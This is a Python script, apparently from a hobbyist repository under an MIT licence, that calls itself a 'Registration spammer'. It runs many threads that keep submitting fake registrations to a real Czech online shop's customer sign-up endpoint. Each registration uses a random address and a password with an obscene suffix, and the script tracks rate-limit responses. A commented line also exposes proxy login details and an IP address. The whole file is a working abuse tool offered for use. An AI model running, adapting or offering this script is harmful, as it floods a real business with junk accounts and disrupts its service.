"""
MIT License

Copyright (c) 2022 Xel Lu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

#WARNING: YOUR IP WILL BE BLACKLISTED AFTER SOME AMOUNT OF REQUESTS, PROXIES SOON(tm)
import threading, requests, random, string, os, time

def printer():
    while True:
        os.system("cls")
        print(f"""                            _       _     _   
  __ _ _   _  __ _ _   _  | | __ _| |__ | |_ 
 / _` | | | |/ _` | | | | | |/ _` | '_ \| __|
| (_| | |_| | (_| | |_| |_| | (_| | |_) | |_ 
 \__, |\__,_|\__, |\__,_(_)_|\__, |_.__/ \__|
 |___/       |___/           |___/           
> Registration spammer   
                
Threads Active> {threads}

200> Successful Requests> {success}x
429> Ratelimited> {ratelimit}x
302> Found> {found}x
***> Failed Requests> {fail}x""")
        time.sleep(0.5)

success = 0
fail = 0
ratelimit = 0
found = 0

def run():
    global success, ratelimit, fail, found
    while True:
        passwrd = "".join(random.choice(string.ascii_letters) for x in range(10)) + "-ggez-cocksocker.gg-na-topu",
        r = requests.post("http://www.shopaholicadel.cz/action/Customer/Register/", params={
    "defaultGroupRequiresFullProfile": 0,
    "fromSocial": "", 
    "surname": "",
    "billFullName": "", 
    "email": "".join(random.choice(string.ascii_letters) for x in range(10)) + "@gmail.com",
    "password": passwrd,
    "passwordAgain": passwrd,
    "consents[]": 28})#, proxies={"http": "thffervk@vjgxq92bskzu:144.168.217.89:8781"})
        rcode = r.status_code
        if rcode == 200: success += 1
        elif rcode == 302: found +=1
        elif rcode == 429: ratelimit += 1
        else: fail += 1
        time.sleep(50/1000)

a_threads = 0

threads = int(input("Threads> "))
threading.Thread(target=printer).start()
for t in range(threads):
    a_threads += 1
    threading.Thread(target=run).start()
    
while True:
    try:
        time.sleep(1)
    except:
        os._exit(0)